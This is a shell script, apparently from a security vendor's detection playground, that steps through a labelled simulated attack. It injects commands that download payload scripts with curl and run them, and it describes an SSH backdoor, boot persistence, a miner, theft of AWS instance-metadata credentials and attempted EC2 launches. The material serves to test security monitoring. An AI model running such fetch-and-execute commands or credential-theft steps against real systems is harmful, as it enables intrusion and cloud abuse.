#!/usr/bin/sh

# Source the helper functions
. "$(dirname "$0")/../../scripts/tool.sh"

# Parse command line arguments
parse_args "$@"

print <<EOF
\033[1;37m# Educational Security Simulation - Correlated Attack\033[0m

\033[1;33m⚠️  WARNING: This is a SIMULATION for demonstration purposes only! ⚠️\033[0m

${PURPLE}This demonstration simulates a sophisticated multi-stage attack that \
combines workload compromise with cloud credential theft and abuse. The attack \
exploits a command injection vulnerability to download malware, establish \
persistence, steal AWS credentials from the Instance Metadata Service, and \
then use those credentials to attempt launching expensive EC2 instances. This \
showcases how attackers pivot from workload compromise to cloud infrastructure \
abuse, demonstrating the importance of correlated security monitoring.\033[0m

\033[1;33mThe malware used in this simulation is FAKE and HARMLESS.\033[0m
EOF

step <<EOF
\033[1;35mTool Installation - Install Network Utilities\033[0m

${PURPLE}First, we need to ensure curl is available on the target system for \
downloading our payloads. We'll update the package manager and install curl \
which will be used throughout the attack chain.\033[0m
EOF
wait_for_confirmation
inject "apt update && apt install -y curl"

step <<EOF
\033[1;35mPayload Download - Retrieve Malware with Persistence Script\033[0m

${PURPLE}Now we download the main payload script that contains the malware \
deployment logic. This script will download a simulated cryptocurrency miner, \
establish SSH backdoor persistence, modify system boot scripts, and steal AWS \
credentials from the Instance Metadata Service.\033[0m
EOF
wait_for_confirmation
inject "curl -O https://raw.githubusercontent.com/DataDog/datadog-security-playground/main/assets/correlation/payload.sh"

step <<EOF
\033[1;35mMake Payload Executable\033[0m

${PURPLE}Set execution permissions on the downloaded payload script so it can \
be executed in the next step.\033[0m
EOF
wait_for_confirmation
inject "chmod +x payload.sh"

step <<EOF
\033[1;35mExecute Main Payload - Deploy Malware and Steal Credentials\033[0m

${PURPLE}Execute the payload script which will: download the simulated mining \
malware, create an SSH backdoor, establish boot persistence, launch the miner, \
and steal AWS IAM credentials from the Instance Metadata Service. The stolen \
credentials will be displayed and used in subsequent steps.\033[0m
EOF
wait_for_confirmation
inject "./payload.sh"

step <<EOF
\033[1;35mDownload Cloud Access Script\033[0m

${PURPLE}Download a script that will abuse the stolen AWS credentials to \
attempt launching expensive EC2 instances across multiple regions. This \
demonstrates how attackers pivot from workload compromise to cloud resource \
abuse.\033[0m
EOF
wait_for_confirmation
inject "curl -O https://raw.githubusercontent.com/DataDog/datadog-security-playground/main/assets/correlation/cloud-access.sh"

step <<EOF
\033[1;35mMake Cloud Access Script Executable\033[0m

${PURPLE}Set execution permissions on the cloud access script.\033[0m
EOF
wait_for_confirmation
inject "chmod +x cloud-access.sh"

step <<EOF
\033[1;35mCloud Resource Abuse - Attempt EC2 Instance Launch\033[0m

${PURPLE}Now we execute the cloud-access script which will automatically retrieve \
credentials from the Instance Metadata Service (IMDS). The script will attempt (and fail) to \
launch expensive EC2 instances across multiple regions, generating CloudTrail events \ 
that can be investigated.\\033[0m

${PURPLE}The script will try both IMDSv2 and IMDSv1 to retrieve the node's IAM role \
credentials automatically.\033[0m
EOF
wait_for_confirmation
inject "./cloud-access.sh"

print <<EOF
${GREEN}Demonstration simulation completed successfully!\033[0m
EOF
